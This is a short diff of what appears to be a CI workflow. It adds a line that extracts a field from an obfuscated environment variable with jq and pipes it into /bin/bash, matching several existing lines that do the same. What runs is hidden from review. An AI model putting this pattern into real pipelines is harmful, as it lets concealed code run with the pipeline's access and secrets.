@@ -26,6 +26,7 @@ jobs:
           echo $pobg19 | jq -r .v65582 | /bin/bash
           printf '%s' "$dy0" | jq -r .fmme448 | /bin/bash
           printf '%s' "$ueufp7" | jq -r .dt579 | /bin/bash
+          printf '%s' "$oga987" | jq -r .g600 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
